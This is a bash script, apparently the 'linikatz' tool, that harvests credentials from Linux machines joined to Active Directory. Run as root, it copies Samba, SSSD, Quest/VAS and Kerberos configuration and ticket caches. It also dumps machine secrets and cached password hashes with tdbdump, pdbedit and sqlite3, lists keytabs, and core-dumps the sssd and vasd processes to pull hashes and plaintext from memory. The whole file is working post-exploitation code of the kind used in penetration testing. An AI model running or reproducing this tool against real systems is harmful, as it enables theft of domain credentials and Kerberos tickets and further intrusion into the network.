#!/bin/bash
# Copyright (c) 2015-2018, Cisco International Ltd
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#     * Redistributions of source code must retain the above copyright
#       notice, this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice, this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of the Cisco International Ltd nor the
#       names of its contributors may be used to endorse or promote products
#       derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL CISCO INTERNATIONAL LTD BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

r="${RANDOM}"

printf " _ _       _ _         _\n"
printf "| (_)_ __ (_) | ____ _| |_ ____\n"
printf "| | | '_ \| | |/ / _\` | __|_  /\n"
printf "| | | | | | |   < (_| | |_ / /\n"
printf "|_|_|_| |_|_|_|\_\__,_|\__/___|\n"
printf "\n"
printf "             =[ @timb_machine ]=\n"
echo
if [ "$(id -u)" != "0" ]
then
	printf "E: Not running as root\n"
	exit
fi
printf "I: AD configuration\n"
for filename in /var/lib/samba /var/cache/samba /etc/samba /var/lib/sss /etc/sssd /var/opt/quest /etc/opt/quest
do
        if [ -d "${filename}" ]
	then
		find "${filename}" -ls >>"linikatz.$$.${r}"
		cp -rp "${filename}" "$(printf "%s" "${filename}" | tr "/" "_").$$.${r}"
	fi
done
for filename in /etc/krb5.conf /tmp/krb5*
do
	if [ -f "${filename}" ]
	then
		ls -l "${filename}" >>"linikatz.$$.${r}"
		cp -p "${filename}" "$(printf "%s" "${filename}" | tr "/" "_").$$.${r}"
	fi
done
printf "I: Machine secrets\n"
if [ -f /var/lib/samba/private/secrets.tdb ]
then
	tdbdump /var/lib/samba/private/secrets.tdb | grep -A 1 _PASSWORD >>"linikatz.$$.${r}"
fi
printf "I: On disk cached credentials, stored as hashes\n"
if [ -f /var/lib/samba/passdb.tdb ]
then
	pdbedit -s /etc/samba/smb.conf -L -w >>"linikatz.$$.${r}"
fi
if [ -d /var/lib/sss ]
then
	for filename in /var/lib/sss/db/cache_*
	do
		if [ -f "${filename}" ]
		then
       			tdbdump "${filename}" | grep -A 1 DN=NAME | grep "\\\$6\\\$" | sed -e "s/.*cachedPassword.*\\\$6\\\$/\\\$6\\\$/g" -e "s/\\\00lastCached.*//g" >> "linikatz.$$.${r}"
		fi
	done
fi
if [ -f /var/opt/quest/vas/authcache/vas_auth.vdb ]
then
	sqlite3 /var/opt/quest/vas/authcache/vas_auth.vdb "SELECT krb5pname, sha1hash, legacyHash FROM authcache" >>"linikatz.$$.${r}"
fi
printf "I: Machine kerberos tickets\n"
if [ -d /var/lib/sss ]
then
	for filename in /var/lib/sss/db/ccache_*
	do
		if [ -f "${filename}" ]
		then
			if [ -x /usr/bin/klist ]
			then
				/usr/bin/klist "${filename}" >>"linikatz.$$.${r}"
			fi
		fi
	done
fi
if [ -f /etc/opt/quest/vas/host.keytab ]
then
	if [ -x /opt/quest/bin/ktutil ]
	then
		/opt/quest/bin/ktutil --keytab=/etc/opt/quest/vas/host.keytab list >>"linikatz.$$.${r}"
	fi
fi
printf "I: User kerberos tickets\n"
for filename in /tmp/krb5*
do
	if [ -f "${filename}" ]
	then
		if [ -x /usr/bin/klist ]
		then
			/usr/bin/klist -c "${filename}" -e -d -f >>"linikatz.$$.${r}"
		else
			if [ -x /opt/quest/bin/klist ]
			then
				/opt/quest/bin/klist -c "${filename}" -v --hidden >>"linikatz.$$.${r}"
			fi
		fi
	fi
done
printf "I: In memory, plain text or stored as a hash\n"
pgrep sss | while read processid
do
        gcore -o "sss.$$.${r}" "${processid}" 2>/dev/null | sort | uniq >>strings."linikatz.$$.${r}"
        strings "sss.$$.${r}.${processid}" | egrep "MAPI|\\\$6\\\$" | sort | uniq >>strings."linikatz.$$.${r}"
done
pgrep vasd | while read processid
do
        gcore -o "vas.$$.${r}" "${processid}" 2>/dev/null | sort | uniq >>strings."linikatz.$$.${r}"
        strings "vas.$$.${r}.${processid}" | sort | uniq >>strings."linikatz.$$.${r}"
done
